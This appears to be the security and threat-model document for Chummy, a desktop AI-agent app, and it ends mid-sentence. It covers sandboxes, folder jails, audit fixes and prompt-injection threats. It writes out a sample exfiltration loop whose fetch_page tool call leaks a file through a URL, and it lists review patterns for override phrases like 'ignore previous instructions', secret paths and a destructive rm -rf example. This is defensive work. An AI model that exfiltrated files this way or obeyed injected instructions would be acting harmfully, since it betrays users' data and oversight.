# Security and threat model

Chummy is for people who use AI on their own laptops and desktops, many of
whom won't read a settings page closely. So the defaults have to be safe,
the risky switches have to explain themselves, and a mistake should cost as
little as possible. This file is the threat model, what protects against
each threat, where each protection lives in the code, the sandboxes tools
run in, and the notes from every security audit and pass. Ideas not built
yet are in the [roadmap](roadmap.md).

## What Chummy protects against

| Threat | Protection |
|--------|------------|
| **The model** doing something you didn't intend, because it's small and confused, or because something it read told it to (*prompt injection*: a web page, a file dropped into a watched folder, a document). | Each agent is jailed to one folder you chose. Tools and internet access are off until you turn them on. Tools only run as WebAssembly. Tools that can go online ask you first by default. Loops can only narrow what an agent may do. |
| **Files and loops from elsewhere**: an imported loop, loop configuration or job, a tool, a model download. | Loop and job files are strict and size-limited. A loop that isn't on the signed list of trusted loops gets a **review** (a scan of everything it can do) before it can be imported, run or opened, and imported loop settings are reviewed the same way. Imported jobs arrive switched off. Tools can't be installed from files (only the built-in suite). Model weights must be safetensors, and code from model repos is never run. |
| **Other programs and people on the network.** | Nothing listens on the network. The built-in engine listens on 127.0.0.1 only, behind a random 192-bit token. Model servers on the internet must use https. |
| **Mistakes by the person using it.** | Whole drives, your home folder, system and hidden settings folders and Chummy's own folder can never be a workspace. Personal and busy folders get a warning. Every switch that widens access asks first and says what it means. Chummy can't hide in the background unless you choose that. |

Out of scope: malware already running as you. It can read your files and
Chummy's folder directly, and change Chummy's settings file. The OS account
is the boundary (see *Known risks*).

## The rules

- **Rust decides.** Every permission check, path check and confirmation
  happens in Rust. The UI never sends a workspace path; it holds a one-time
  token for a folder Rust showed and confirmed.
- **Off until you say so.** Tools, internet access, each tool, and each
  tool's internet access start off. Turning any of them on, or turning
  **Ask before tools go online** off, shows a native confirmation.
- **Loops narrow, never widen.** A loop chooses which tools each model block
  offers and can ask for more confirmation. It can't turn on a tool,
  internet access, or skip a confirmation the app requires. A job runs as an
  agent and can't do anything that agent can't.
- **No scripts outside the sandbox.** Every block is text handling, a model
  call, or file work inside the agent's folder. The only code a loop runs is
  a tool, and tools only run as WebAssembly (CPython for WASI under
  Wasmtime): no sockets, no files outside the agent's folder, memory and time
  limits, and web requests only through Chummy's checks.
- **One way to ask you.** Questions and tool approvals from chats, test runs
  and jobs all go through one broker in Rust. Only Chummy's windows can
  answer, and answers are checked: an approval takes only Allow or Don't
  allow, and a question takes only text, up to 20,000 characters. Question ids
  are 128-bit random values.
- **Visible while running.** The tray icon is always there while Chummy
  runs. Closing the main window asks whether to quit (stopping every run) or
  keep running in the tray. Chummy doesn't start at login.

## Security features in the code

A short map of the protections and where they live in the code.

| Protection | What it does | Where |
|---|---|---|
| **Folder jail** | Each agent sees one folder the user picked and confirmed in a native dialog. Whole drives, the home folder, system and hidden settings folders and Chummy's own folder are always refused. File access goes through a `cap-std` handle, so symlinks, `..` and junctions can't escape. | `crates/sandbox` (`protected.rs`, `jail.rs`, `workspace.rs`); `commands/agents.rs` hands the UI a one-time token, never a path. |
| **Off by default** | Tools, internet access, each tool and each tool's internet access start off. Turning one on shows a native confirmation from Rust. | `commands/agents.rs`, `commands/tools.rs`, `dialogs.rs` |
| **Every level must agree** | A tool runs only if it's on app-wide, for the agent and in the block; going online also needs the app's, the tool's, the agent's and the block's switch. Loops can only narrow this. | `crates/runner` (`AgentHost::tools`, `net_policy`), `crates/flow` (`ToolSwitches`) |
| **Sandboxed tools only** | Tools are Python and run only in a sandbox backend: Native (CPython for WASI under Wasmtime, with memory and time limits), Container (locked-down Docker/Podman, approved image ID, no network) or OpenShell. There is no unsandboxed mode and no script block. | `crates/tools/src/sandbox/`, [Sandboxes](#sandboxes-where-tools-run) |
| **Web access through Chummy** | Tools have no network of their own. Requests go through `NetPolicy`: no private addresses, DNS pinned, redirects re-checked, size caps. | `crates/tools/src/net.rs` |
| **Risky tools ask** | Tools marked `risky` (e.g. `run_command`, `run_shell`) show "Potentially unsafe", confirm when switched on and can ask before each use. | tool headers, `commands/tools.rs`, `AskBroker` |
| **One way to ask** | Questions, tool approvals and budget asks from chats, tests and jobs all go through one broker; answers are checked. | `crates/scheduler/src/asks.rs`, `commands/asks.rs` |
| **Secrets in the keychain** | API keys and the log key live only in the OS keychain. URLs with credentials are refused; plain `http://` to a public host warns and asks. | `crates/store/src/secrets.rs`, `crates/llm/src/config.rs`, `commands/providers.rs` |
| **Encrypted run logs** | Run logs are sealed line by line (XChaCha20-Poly1305); the key can be exported in a passphrase-locked file (Argon2id). | `crates/log/src/crypt.rs` |
| **Your model, your call** | Chummy never calls a model outside a loop unless that connection's **Use model within app** is on (off by default). | `src-tauri/src/in_app.rs` |
| **Per-window permissions** | Each window may call only the commands it needs. | `src-tauri/capabilities/*.json` |
| **Private data folder** | The Chummy folder is made private to the user (700/600 on macOS and Linux) at every start. | `crates/store` |
| **Strict files** | Loop, job and config files are strict (`deny_unknown_fields`), versioned and size-limited; imported jobs arrive switched off. | `crates/flow/src/format.rs`, `validate.rs`, `crates/scheduler` |
| **Loop review and trusted loops** | Only loops on the trusted list run or open in the editor: built-in templates (hashed at build time), loops saved from trusted ones, and loops the user reviewed and trusted. Anything else (an import, a file copied into the folder, imported loop settings) gets a scan and the Review window first. The list carries an HMAC keyed in the keychain. | `crates/flow/src/review.rs`, `crates/flow/build.rs`, `src-tauri/src/trust.rs`, `commands/review.rs`, `ui/src/windows/review/` |

When a change touches permissions, secrets or untrusted content, think
through both levels (app and agent) and the block override, and add a note
to this file.

## Sandboxes: where tools run

Chummy's loops, model calls and permission checks always run in Chummy
itself. The one piece of user-defined code a loop can start is a **tool call**,
and the sandbox decides where that runs. There's one sandbox for the whole
app, chosen in **Settings → Security and Privacy → Sandbox**. The default is
**Native**.

| Sandbox | What runs a tool call | Real programs | Needs |
|---|---|---|---|
| **Native** (default) | CPython 3.14 for WebAssembly under Wasmtime, built into Chummy | no | nothing (the WebAssembly Python comes with Chummy) |
| **Container** | a fresh Docker or Podman container per call | yes, whatever the image has | Docker or Podman already installed and running |
| **OpenShell** | an NVIDIA OpenShell sandbox, kept per workspace | yes, whatever its image has | the `openshell` program and a working OpenShell gateway |

Chummy never installs Docker, Podman or OpenShell, and never suggests one on
its own. Switching to Container or OpenShell asks you natively; switching back
to Native never asks.

### What's the same in every sandbox

- The tool sees **only the agent's workspace** and its own files, read-only.
  Nothing else on the computer.
- The tool has **no network of its own**. `chummy.http` sends requests to
  Chummy over the tool's stdin/stdout, and Chummy decides each one with the
  same checks everywhere: the Internet switch in Security and Privacy, the
  tool's and the agent's switches, the block's switch, "ask before tools go
  online", and no addresses on this computer or the local network.
- The tool gets **no host environment variables**, only what Chummy passes
  (`TZ`).
- Tools keep **one format** (a PEP 723 Python file, see [File formats → Tools](file-formats.md#tools)) and
  are always installed and described with the WebAssembly Python, whichever
  sandbox later runs them.

### Which tools a sandbox can run

A tool says what it needs in its header:

- `needs = ["programs"]`: it starts other programs, so it only works in
  Container or OpenShell (the built-in `run_shell` is one).
- `requires-python`: the sandbox's Python must satisfy it (the built-ins need
  3.14 or newer, so a container image needs Python 3.14+).

Settings → Tools and each agent's tool list **grey out** tools the current
sandbox can't run, with the reason. They're never offered to the model (a
block can't turn them on either). A greyed tool can still be switched off,
but not on. If the sandbox isn't ready (Docker isn't running, no image yet,
OpenShell's gateway is unreachable), no tools are offered until a check
passes. Container and OpenShell are checked at start-up, whenever their
settings change, and with **Check again**.

### Native

The original sandbox: see [File formats → Tools → The sandbox](file-formats.md#the-sandbox). Each call is a
fresh WebAssembly instance with `/workspace`, `/tool`, `/lib` and `/chummy`
preopened; WASI has no sockets and no way to start processes.

### Container

Each call is `docker run --rm -i` (or `podman run`) with:

- `--network none`, `--read-only` root filesystem and a 256 MB `/tmp`;
- `--cap-drop ALL`, `--security-opt no-new-privileges`, `--ipc none`,
  `--pids-limit 256`, memory and CPU limits (Settings), `--log-driver none`
  (the engine keeps no copy of the tool's output);
- exactly three mounts: the workspace at `/workspace` (read/write), the tool
  at `/tool` and Chummy's runner at `/chummy` (both read-only). The Docker
  socket is never mounted;
- with Docker on Linux and macOS, the workspace owner's user and group
  instead of root, so files the tool writes belong to you. Rootless Podman
  maps the container's root to you already;
- `--pull never` and the **approved image ID**. You choose an image name
  (default `python:3.14-slim`) and either **Download image** (`docker pull`)
  or **Use the copy on this computer**; both ask natively and record the
  image's ID. Calls run that ID, so if the name later points to a different
  image nothing changes until you approve again. Changing the name or the
  engine clears the approval.

A call that runs past its time limit is stopped with `docker kill`, and the
container is removed.

### OpenShell

Chummy drives the `openshell` program (the same commands you'd type: `sandbox
create`, `upload`, `exec`, `download`, `delete`), so it works with whatever
gateway your OpenShell is set up for.

- **Policy.** Chummy's sandboxes are created with its own policy: Landlock
  required (`hard_requirement`), the unprivileged `sandbox` user, only
  `/usr`, `/lib` and `/etc` readable, only `/sandbox` and `/tmp` writable, and
  **no network policies at all**, so nothing inside can connect anywhere.
- **One sandbox per workspace**, named from a hash of the workspace's
  location (two agents never share one), kept between calls because creating
  one takes a while. **Remove them** in Settings deletes them all; Chummy makes
  new ones when needed.
- **The workspace is copied in and out.** OpenShell can't mount a folder, so
  for each call Chummy copies the workspace (through the agent's jail, links
  left out) into `/sandbox/<call id>/workspace`, runs the tool there, copies
  the result back and removes the call folder. Bringing changes back:
  - new and changed files are written and files the tool deleted are deleted,
    **only where the workspace still matches what was copied in**; if you (or
    another chat) changed a file during the call, your version is kept and
    the tool's log says so;
  - links and special files that come back are ignored;
  - changes come back only from a call that finished; a call that crashed or
    timed out changes nothing;
  - workspaces over 20,000 files or 512 MB can't be copied (the tool reports
    it), so OpenShell suits small project folders best.
- Because one sandbox serves one workspace for many calls, a tool could leave
  something in `/tmp` that a later call in the same workspace sees. It never
  reaches another agent's sandbox.

The OpenShell backend is tested against a stand-in for the `openshell`
program (`crates/tools/tests/fake_openshell.py`), built from the real CLI's
argument definitions. It hasn't been run against a real OpenShell gateway yet.

### The programs Chummy starts

For Container and OpenShell, Chummy itself starts `docker`/`podman`/`openshell`
outside any sandbox, to create the sandbox. Chummy finds them on `PATH` and in
the usual install places. You can point it at one with **Choose…**, which only
works through a native file picker (a window can't type a path in), refuses
files inside any agent's workspace or the Chummy folder (a tool could replace
those), and asks you to confirm. Chummy passes these programs only the
environment variables they need (`PATH`, `HOME`, `DOCKER_HOST`, proxies and
the like).

### Adding a sandbox

`crates/tools/src/sandbox/`: implement `SandboxBackend` (`kind`, `check`,
`call`), add a `SandboxKind` variant and its options to `SandboxSettings`, and
build it in `AppState::build_sandbox`. Process-based backends can reuse
`process::run`, which speaks the tool line protocol over a child's
stdin/stdout, and `sync` if they need to copy the workspace.


## Audit, pass 5

Every IPC command, capability file, and the scheduler, runner and engine
paths were reviewed, with a focus on what a light AI user could get wrong
without noticing.

### Fixed

1. **Online tools ran without asking once allowed.** A model that read a
   malicious page could use a web tool to send your files somewhere (for
   example in a URL), including in unattended jobs. Now every call to a tool
   that can go online waits for your OK by default, in chats and in jobs.
   Turning that off asks for confirmation and explains why it matters. Any
   tool can also be set to **Ask me before each use**, and a Run tool block
   can ask for every call.
2. **Approvals could hide what a tool would do.** Argument values were cut
   at 300 characters, so a long URL could hide its end. Text-direction and
   other invisible characters could also make an argument read differently
   from what it is. Now values are shown up to 2,000 characters with an
   explicit "N more characters not shown", control and direction characters
   appear as visible codes, and **Show the exact arguments** shows the raw
   JSON.
3. **Plain http to the internet.** A model server address like
   `http://api.example.com` sent API keys and conversations unencrypted.
   Plain http is now only accepted for this computer and the local network
   (loopback and private addresses, `.local` and single-word host names), and
   addresses with a user name or key in them are refused. *(Changed after
   pass 8: plain http elsewhere is allowed again, for servers behind a VPN
   without a usable certificate, but saving such an address shows a warning
   in the form and a native confirmation naming the risk, and the choice is
   written to the system log.)* The same check
   runs before **Test connection** and model listing, which send the stored
   key.
4. **Two copies of Chummy could run at once** (for example, without a
   session bus on Linux, where the single-instance check fails). They would
   run the same jobs twice and race on the same files. A second launch now
   hands over to the first, and an OS file lock on the Chummy folder stops it
   if that fails.
5. **The built-in engine's port could be taken.** Chummy picked a free port,
   released it, and passed it to the engine. Another local program could
   take the port in between and receive the engine's token and your
   prompts. The engine now binds port 0 itself and reports the port it got.
6. **Whole personal folders as workspaces.** Giving an agent your entire
   Documents folder was one click away. Choosing Documents, Desktop,
   Downloads, Pictures, Music, Videos, a synced cloud folder, a git
   repository, or a folder with over 500 files now shows a warning that
   suggests a new folder just for the agent.
7. **Windows had more API access than they use.** Every window had
   `core:default` (window, webview, menu, tray, path and app APIs), but the
   UI only listens to events. Windows now get only event listening, plus
   their own commands.
8. **Content security policy.** Tightened so objects, frames, workers,
   `<base>` and form submissions are all blocked. (Pass 5 also froze
   JavaScript prototypes; pass 6 removed that because it stopped the loop
   editor's graph library from loading. The CSP, which allows only
   Chummy's own scripts, is the protection that matters here.)
9. **Notifications could show private text on a locked screen.** They now
   only say who is asking ("Morning digest has a question for you") or which
   job finished, never the question or reply.
10. **Crashes on non-English error text.** Two error messages were
    capitalized by byte slicing, which panics on a non-ASCII first letter.
11. **A stop could be recorded as a failure.** Stopping a run that was
    waiting for an answer could record it as failed ("question withdrawn").
    It's now recorded as stopped.

### Checked, no change needed

- The built-in engine listens on 127.0.0.1 only. It takes a 192-bit token
  from the OS random source, passed in its environment (not its command
  line), and runs offline (`HF_HUB_OFFLINE`).
- Model downloads: weights must be safetensors and `trust_remote_code` is
  never set. Downloads are checksummed and resumed safely.
- Tools: no sockets in the sandbox, so every web request goes through
  Chummy. Requests to local, private and link-local addresses are refused
  after DNS resolution. Connections are pinned to the checked addresses,
  each redirect is checked again, and responses are capped at 2 MB.
- The folder jail: all file access goes through `cap-std`, so symlinks and
  `..` can't escape. FIFOs and devices aren't read, and Windows device names
  are refused. Folder triggers poll only through the jail.
- Job files are strict (unknown fields refused), size-limited, and checked
  for paths outside the agent's folder. Imported jobs arrive switched off.
  An agent or loop the job names that doesn't exist here is replaced (by
  your first agent, or the agent's own loop) for you to review.
- The scheduler caps repeating jobs at one run per 5 minutes and folder
  triggers at 30 runs an hour per job. It never runs a job twice at once,
  and every job can have a time limit.
- Chat replies are HTML-escaped before the light formatting is applied.
- Secrets are only in the OS keychain. The Chummy folder is private to the
  user (0700 on Unix).

## Tool switches (two levels)

- A tool is offered only when it is on **app-wide**: tools on in Permissions
  and the tool on in Settings → Tools. Nothing in a loop can get past this.
- Then the **agent's** switch decides. Loop blocks use the agent's tools; a
  block can only **disable** tools for itself (all of them, or chosen ones),
  never turn on one the agent has off. The same goes for the block's internet
  switch, which can only turn internet off. A loop downloaded from someone
  else therefore can't give itself more than the agent allows. (Until
  v0.1.1 a block could also turn a tool on; old loops that did now just
  use the agent's setting.)
- The built-in loops only give tools to the blocks that do the work; checks,
  plans and notes have tools off.
- Calls still ask first as before (tools set to ask, and online calls when
  “Ask before tools go online” is on).

## The command tool (potentially unsafe)

`run_command` gives the model a shell-style command line, because models are
used to working that way. It is **not** a real shell and never runs anything
on your computer: it is a small shell written in Python that runs in the same
WebAssembly sandbox as every other tool, in the agent's folder, with no
network (`python` runs in the sandbox's own interpreter; `pip` can't install
anything). Paths outside the folder are refused, and so is deleting the
folder itself. Its commands (sed, awk, find, xargs and the rest) are Python
too, run every path they touch through the same check, and can only run
other commands of this small shell: `awk` has no `system()` or pipes, `xargs`
and `find -exec` run built-in commands only, and links can't be made.

What it *can* do is a lot of damage inside the folder in one call (`rm -rf
src`, a `python` script that rewrites every file). So it is marked
**Potentially unsafe** (`risky = true` in its header): it starts off like
every tool, switching it on shows a native confirmation that says so, and
switching it on the first time also turns on **Ask me before each use**, so
each command waits for your OK in chat until you turn that off. Keep a copy
of anything important in a folder you give an agent with this tool.

## Pass 6 changes

- **Per-agent tool and internet switches.** A tool runs only when it is on
  app-wide (Permissions and Tools), for the agent, and ticked in the block. (Since replaced by two levels with a per-block override; see Tool switches above.)
  Going online needs four switches: Permissions, the tool, the agent and the
  block ("may use the internet"). New agents start with no tools and
  offline; agents that existed before pass 6 kept what they could already
  use. Turning an agent's internet on asks first.
- **Daily token limits.** Each model connection has a daily limit (1,000,000
  tokens by default, can be turned off), so a looping agent or a scheduled
  job can't run up a large bill. When a limit is reached the block waits
  until midnight, stops the run, or asks you for more, as set in the block.
  Usage is kept in `usage.json` (31 days, counts only, no text).
- **Prompted tool calls are untrusted text.** In prompted and off modes, the
  model writes calls as text that Chummy parses. Parsed calls go through
  exactly the same checks as native ones (tool lists, the jail, internet
  switches and **Ask me**). Calls to tools the block doesn't offer are
  refused, and malformed calls are reported back to the model, never run.
- **Agent loop configuration is checked.** Per-agent block settings are
  validated against the block catalog and the whole loop is re-analyzed
  before they are saved, so an imported `chummy.loopconfig` file can't
  break a loop or add blocks. It can only change settings of blocks the
  loop already has, and it cannot turn on a tool or the internet that the
  agent or the app doesn't allow.

## Pass 7: logs

- **Run logs hold what the agent saw.** A run's log records every block's
  inputs and outputs, so it can contain your messages, model answers and
  text from files the agent read. Logs stay in the Chummy folder (private to
  you), are never sent anywhere, and are deleted after 30 days (or sooner
  past 1 GB). Values are cut to 6,000 characters each.
- **The system log holds no content.** It records what Chummy did (starts,
  settings and permission changes, runs and how they ended, jobs, tools run
  and whether they could go online, questions asked, errors) but never
  message text, file contents, tool arguments or keys.
- **Read only.** The Logs window can read and search logs but not change
  them. Run ids are checked before they're used as file names, so a log
  can't be read from outside the logs folder.

## Pass 8: encrypted logs, formatted replies

- **Run logs are encrypted by default.** Each line is sealed separately
  with XChaCha20-Poly1305 (random 192-bit nonce per line, bound to a fixed
  context string), as `enc1:<key id>:<base64>`. The 256-bit key comes from
  the OS's secure random source on first use and lives only in the OS
  keychain (entry `log-key`); the key id is the first 8 bytes of its
  SHA-256. If the keychain can't be used, encrypted run logs simply aren't
  written: Chummy never falls back to plain text on its own.
- **Exporting the key** seals it with a key derived from a passphrase of at
  least 10 characters by Argon2id (64 MiB, 3 passes), again with
  XChaCha20-Poly1305. Importing checks the passphrase and the fingerprint,
  refuses unreasonable Argon2 settings, and asks before replacing a
  different key (logs written with the old key then can't be read here).
  Exports and imports are written to the system log.
- **Turning encryption off asks first**, and only affects new logs.
  Detail can be lowered to shortened values (500 characters), steps only (no
  text) or off; the system log's level goes down to off.
- **What it doesn't cover:** chat history and job history are still plain
  text in the Chummy folder, and anything that can use your unlocked
  keychain as you can read the key.
- **Formatted replies stay inert.** Model text is escaped before any
  Markdown is applied, so it can never add HTML; links become buttons that
  Rust opens only after showing the full address and asking (web and mail
  links only). Math goes through KaTeX with `trust` off (so `\href` and
  similar are refused) and size and macro-expansion limits.

## Pass 11: context lengths

- Finding a model's context length makes a few extra read-only requests,
  only to the model connection's own address and with its own key (the
  model list, and on local servers `/props`, `/api/show` or
  `/api/v0/models/<model>`). They time out after a few seconds, so saving a
  connection never hangs; nothing they return is shown as HTML or run.
- Reported lengths are only used as numbers (capped at `u32`), and a user
  setting can lower but not raise them.

## Model use outside loops

A model connection is only called by the user's loops, unless its **Use model
within app** switch is on (off by default; `ProviderConfig::use_in_app`).
Every model call that doesn't come from a loop goes through
`Settings::in_app_model` (`src-tauri/src/in_app.rs`); today that's naming a
chat after its first reply. Those calls check the daily token limit first and
are counted in it. Test connection is an explicit user action and isn't
gated. Context-length detection reads the server's model metadata only and
makes no model calls.

## Pass 14: choosing the sandbox

Tool calls can run in Native (WebAssembly, the default), Container (Docker or
Podman) or OpenShell; the full design is in [Sandboxes](#sandboxes-where-tools-run). The
Permissions page is now **Security and Privacy**, with the sandbox choice on
it. What was checked:

- **Nothing widens without a native confirm.** Switching to Container or
  OpenShell, approving a container image (download or local copy) and
  choosing the engine's program all ask from Rust. A window can send only the
  engine, the image *name* and limits; the approved image ID and program
  paths never come from a window.
- **The program Chummy starts** runs outside any sandbox, so it can only be
  set with a native file picker and is refused inside any agent's workspace
  (where a tool could replace it) or the Chummy folder. Its environment is
  reduced to what the engine needs.
- **Containers.** `--network none`, read-only root, all capabilities dropped,
  `no-new-privileges`, `--ipc none`, process/memory/CPU limits, no engine
  logs, only the workspace (rw) and the tool and runner (ro) mounted, never
  the Docker socket, not root (Docker on Linux/macOS), `--pull never` and the
  approved image ID. Tested with real Docker: no network, no host files or
  environment, files owned by the workspace's owner, the web bridge still
  under Chummy's policy, timeouts killing the container.
- **OpenShell.** Chummy's policy: Landlock required, unprivileged user,
  system folders read-only, no network rules. The workspace copy goes both
  ways through the jail: links never travel, the tool's changes don't
  overwrite files you changed during the call, size limits apply before
  anything is written back, and only finished calls bring changes back.
- **Same network rules everywhere.** No backend gives a tool a network; web
  requests travel over the tool's stdin/stdout to Chummy's `NetPolicy`.
- **Tools a sandbox can't run are never offered**, and none are while a
  Container or OpenShell sandbox hasn't passed a check.

**The Chummy folder** (after pass 14): it's shown in Security and Privacy
(moved from About). On macOS and Linux Chummy locks it to the owner at every
start: the folder and all folders inside 700, files 600 (owner's execute bit
kept for the engine's programs), links not followed. Windows relies on the
per-user profile's ACLs (a folder given with `--data-dir` outside the profile
is not re-permissioned on Windows yet). `--data-dir <folder>` picks another
folder; it must be empty, new or already a Chummy folder, so the lock-down
never touches someone's unrelated files.

New risks to keep in mind:

- **A container engine is powerful.** Access to the Docker daemon is close to
  root on Linux. Chummy only uses one you already run, and says so when you
  switch. Container escapes through kernel bugs are possible in principle;
  Docker Desktop's VM adds a layer on macOS and Windows.
- **The image is yours to trust.** Chummy pins the ID you approve, but can't
  tell whether an image is benign.
- **OpenShell sandboxes are kept per workspace**, so something a tool leaves
  in `/tmp` can be seen by later calls for the same workspace (never another
  agent's). The OpenShell backend has been tested against a stand-in for the
  `openshell` program, not yet a real gateway.

## Bug sweep and audit after v0.1.0

Reviewed: the folder jail and workspace rules, the tools crate (WebAssembly
host, network policy, package and Python downloads, sandbox backends,
built-ins), every app command and capability file and the CSP, model clients,
the local engine and its downloads, the loop engine, scheduler, logs, runner
and store, and the only place the UI injects HTML (the reply formatter).
Fixed:

- **Planted pipes can't hang Chummy.** Workspace files are opened without
  blocking and checked after opening (before: checked, then opened). A tool
  in a container can `mkfifo` in the workspace; reading or writing it froze
  Read file blocks, folder-triggered jobs and OpenShell staging.
- **A tool stuck reading stdin is stopped.** The WebAssembly time limit only
  interrupts running Python; a wall-clock limit now covers time spent waiting
  in the host (`run_command "python -c 'input()'"` used to hang the run).
- **No unpinned connections.** Web requests from tools are always pinned to
  the addresses that were checked, including hosts a proxy skips (NO_PROXY),
  closing DNS rebinding there. IPv4 hidden in IPv6 (`::a.b.c.d`, 6to4
  `2002::/16`) is checked like plain IPv4.
- **Local model folders can't be made up.** A window can no longer save a
  "local" model connection with its own folder name; local models come only
  from downloading.
- **Look-alike links are visible.** Links are parsed and normalized before the
  confirmation (international domains show as `xn--…`), the dialog names the
  site, and links with invisible or direction-changing characters are refused.
- **Bounded model answers.** Streamed and non-streamed answers stop at 32 MB,
  error bodies, model lists and context lookups at 4 MB, so a broken or
  hostile server can't grow Chummy's memory without end.
- **Bounded loop values.** A block that makes a value over 64 MB stops the run
  (a Combine fed its own output used to double without end).
- **Bounded formatting time.** Link and math patterns in the reply formatter
  have length limits, so a crafted reply (for example echoing a hostile web
  page) can't freeze the window with slow matching.
- **Model file names from Hugging Face** may not contain `\`, `:` or `..`
  (on Windows those could leave the models folder).
- **Crash fixes:** a tool-setup error starting with a non-ASCII character (or
  empty) panicked the setup task and left the window waiting; ids no longer
  silently become all zeros if the system's random source fails, and the
  workspace token refuses instead.

### Decisions after the audit (v0.1.1)

- **Saved API keys don't follow a changed address.** If a model
  connection's address moves to a different server (scheme, host or port)
  and its saved key would be sent there, Chummy asks first in a native
  dialog that a window can't answer for you. Typing the key again counts as
  consent. A yes is remembered for that connection and server until Chummy
  quits.
- **Per-block tools are disable-only** (see Tool switches above).
- **Turning off "Ask me before each use"** for a risky tool (one that writes
  files, runs commands or goes online) needs a native confirmation.
- **Workspaces stay the agent's to change.** Choosing a folder now warns
  that files the agent writes come from a model and should be checked
  before being opened, run or shared outside Chummy, especially scripts,
  programs, shortcuts and project settings such as `.git` or `.vscode`.
- **Pinned engine downloads.** The built-in engine's uv is a fixed release
  checked against SHA-256 sums built into Chummy (before: the latest
  release, checked against a sum downloaded from the same place). Python,
  PyTorch and the packages are exact versions, and the packages'
  dependencies can't be newer than the pin date (`--exclude-newer`; not
  applied to PyTorch's own index, which publishes no dates).
  `scripts/update-engine-pins.py` moves every pin to the latest version.
- **Agents may share folders.** Two agents can use the same folder, or one
  inside the other's, after a native warning that names the agents, says
  which of them can go online or use potentially unsafe tools, and explains
  the risk: a file one agent leaves (for example from a web page) can carry
  instructions another agent follows with its own tools, and an online
  agent can reach the others' files. Turning on internet, or giving a
  potentially unsafe tool, to an agent that shares its folder warns again.
  Under OpenShell, agents in the same folder share its sandbox.
- **The operating system checks certificates.** Every connection Chummy
  makes (models, downloads, tools' web requests) has its certificate checked
  by the OS (Windows' certificate APIs, the macOS Keychain, the system store
  on Linux), never skipped. Before, Chummy compared against a snapshot of
  the system's root certificates, which on Windows can miss roots that
  Windows only fetches when first needed; tool setup then couldn't reach
  github.com. Connection errors now say why (certificate, proxy, time-out,
  no connection).
- **The tools' Python is built, not downloaded.** Each release builds
  CPython for WebAssembly from python.org's source tarball, checked against
  its pinned SHA-256 and its Sigstore signature by the release manager, with
  pinned build tools (wasi-sdk, wasmtime; SHA-256), using CPython's own WASI
  build (`scripts/build-wasi-python.sh`). The result is embedded in the app
  (setting up tools downloads no Python), attached to the release with its
  build details, and covered by a GitHub build provenance attestation
  (`gh attestation verify python-wasi.zip --repo friendlylabz/Chummy`).
  Before, Chummy downloaded a CPython core developer's unofficial WASI build
  from GitHub, pinned by SHA-256.
- **Custom data folders on Windows** get a warning in Security and Privacy:
  Chummy can't lock those down there, so other accounts may be able to read
  or change settings and logs.
- **macOS** builds are signed with the entitlements Wasmtime needs under
  the hardened runtime (`allow-jit`, `allow-unsigned-executable-memory`);
  without them v0.1.0 crashed when setting up tools. The release workflow
  now runs the signed app's `--self-test` before publishing.

## Loops from elsewhere: review and trusted loops (after v0.1.2)

A loop is a program: it runs with everything its agent may do. Blocks can't
widen that (the switches only narrow), but a shared loop could still misuse
what the agent already has. The worst case needs no model at all: Read file
→ Combine (`<tool_call>{"name": "fetch_page", "arguments": {"url":
"https://…?d=_INPUT1_"}}</tool_call>`) → Find tool call → Run tool sends a
file out with nothing in any prompt to see. So loops are now trusted
explicitly, and anything else is reviewed first.

**The trusted list** (`trusted-loops.json` in the Chummy folder, `src-tauri/src/trust.rs`):
fingerprints (SHA-256 of the loop as Chummy saves it, always in the current
format version) of the loops that may run and open without a review.

- **Built-in templates are always trusted** and never stored: `crates/flow/build.rs`
  hashes every `templates/*.chummy.json` at every build (CRLF read as LF), so
  the list can never be stale. The template files are written exactly as
  Chummy saves a loop (`make_templates.py` writes canonical JSON: decimal
  positions, sorted block params), so a file's hash is its fingerprint; a test
  checks every file against both. Blank and Simple chat are files now too.
- **Saving in the editor** trusts the saved version, unless it replaces a
  library loop that isn't trusted. The editor only opens trusted loops
  (`load_loop` refuses others), so what it holds always came from a trusted
  loop, a template or a blank canvas, plus the user's edits.
- **The first start of this version** trusts every loop already in the
  library (they were made or imported before reviews existed).
- **The HMAC.** The file carries an HMAC-SHA256 over its fingerprints, keyed
  by `loop-trust-key` in the OS keychain (made on first start). A list that
  doesn't match (edited outside Chummy, or the key replaced) is emptied with a
  security warning in the system log: built-ins stay trusted, everything else
  needs a review again. Without a keychain the list is kept unsigned; a signed
  list that can't be checked because the keychain can't be read right now is
  ignored and left alone until it can. This raises the bar for malware running
  as you (known risk 3), it doesn't stop it: such a program can often read the
  keychain entry too.
- **Enforced in Rust**: chat and job runs (`chat::prepare`) and the editor
  (`load_loop`) refuse untrusted loops. Up to 20,000 fingerprints are kept.

**The review** (`chummy_flow::review`, shown in the Review window). It reads
the loop without running it:

- **Where data flows.** Every value carries a set of origins (your message,
  chat history, the loop's own text, a model, files, tool results, your
  answers, errors), and for conversations also who wrote the pending tool
  calls and the "assistant" messages. These are followed through every link,
  function (inputs and outputs, context-insensitively: a function used twice
  merges its flows) and memory name (`Save to memory`, `Read memory`,
  `{{name}}` in any text) with a worklist in topological order until nothing
  changes. It's an over-estimate, never a miss for a loop that parsed.
- **Flags.** Serious: tool calls no model wrote (Find tool call fed by
  anything but a model's answer, reaching Run tool); hidden characters
  (zero-width, bidi controls, tag characters, smuggled variation selectors;
  emoji are fine) anywhere, names and notes included; a question asking for a
  password, key, token, code or card; reading a secret-looking path the loop
  names itself (`.env`, `.ssh`, key files…); writing a path that runs code
  (scripts, git hooks, `.vscode/`, shell settings, shortcuts…); a web address
  that goes into model-less tool calls. Warnings: web addresses in its text,
  suspicious wording ("ignore previous instructions", "don't tell the user",
  "secretly", keys and passwords, "send it to …"), a ready-made tool call in
  its text, a model connection the loop chose, messages forged as the model's
  or a tool's, writing its own text into the folder, writing CHUMMY.md, a block
  that acts named like another type, blocks it couldn't read, too large to
  check. Notes: paths it names itself, forced tool calls, high limits.
  Deliberately *not* flagged, because ordinary loops do them: prompts in
  general, models reading files or history and then calling tools, writing a
  model's answers, questions, memory, cycles, the internet being possible. A
  test keeps every built-in template free of serious flags and warnings.
- **The Review window** (`ui/src/windows/review/`) always says that a clean
  review is no guarantee, to import only from people you trust, and what a
  harmful loop could do (and can't). Tabs: Flags; What it can do; Prompts
  (each model block's system message, prompt and reminder, which origins it
  sees, its tools, and the loop's other texts that can reach it); Where data
  flows (each block that acts, unrolled backwards step by step, cycles marked);
  All its text (hidden characters shown as `[U+…]`). Block names always come
  with their real type. With serious flags, a checkbox must be ticked first,
  and trusting always goes through a native confirmation that repeats the
  counts.
- **What opens it.** Importing a loop that isn't trusted (a trusted one, say
  re-imported from an export, comes straight in); opening a library loop that
